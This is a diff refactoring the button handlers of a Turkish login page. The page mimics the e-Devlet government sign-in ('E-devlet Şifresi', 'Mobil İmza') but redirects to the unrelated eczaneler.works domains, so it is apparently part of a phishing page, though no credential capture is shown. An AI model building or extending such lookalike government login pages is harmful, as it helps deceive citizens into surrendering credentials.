@@ -32,10 +32,10 @@
                         <form method="post" id="loginForm" name="sifreGirisForm" autocomplete="off">
                             <fieldset>
                                 <div class="form-row center-item">
-                                    <button onclick="alert('E-devlet Şifresi seçildi.');" class="btn btn-send" name="submitButton" type="button">E-devlet Şifresi</button>
-                                    <button onclick="location.href='https://eczaneler.works/';" class="btn btn-cancel" name="cancelButton" value="İptal">İptal</button>
-                                    <button onclick="alert('Mobil İmza seçildi.');" class="btn btn-send" name="submitButton" type="button">Mobil İmza</button>
-                                    <button onclick="location.href='https://e-dergi.eczaneler.works/';" class="btn btn-send" name="submitButton" type="submit">Giriş Yap</button>
+                                    <button class="btn btn-send" name="submitButton" type="button" onclick="selectMethod('E-devlet Şifresi')">E-devlet Şifresi</button>
+                                    <button class="btn btn-cancel" name="cancelButton" value="İptal" onclick="cancel()">İptal</button>
+                                    <button class="btn btn-send" name="submitButton" type="button" onclick="selectMethod('Mobil İmza')">Mobil İmza</button>
+                                    <button class="btn btn-send" name="submitButton" type="submit">Giriş Yap</button>
                                 </div>
                             </fieldset>
                         </form>
@@ -59,14 +59,26 @@
     </div>
 
     <script type="text/javascript">
+        function selectMethod(method) {
+            if (method === "E-devlet Şifresi") {
+                alert('E-devlet Şifresi seçildi.');
+            } else if (method === "Mobil İmza") {
+                alert('Mobil İmza seçildi.');
+            }
+        }
+
+        function cancel() {
+            window.location.href = "https://eczaneler.works/";
+        }
+
         document.getElementById("loginForm").addEventListener("submit", function (event) {
             var selectedButton = document.querySelector(".btn-send:focus");
             if (selectedButton && selectedButton.textContent === "E-devlet Şifresi") {
                 event.preventDefault();
-                location.href = "https://eczaneler.works/";
+                window.location.href = "https://eczaneler.works/";
             } else if (selectedButton && selectedButton.textContent === "Mobil İmza") {
                 event.preventDefault();
-                location.href = "https://e-dergi.eczaneler.works/";
+                window.location.href = "https://e-dergi.eczaneler.works/";
             }
         });
     </script>
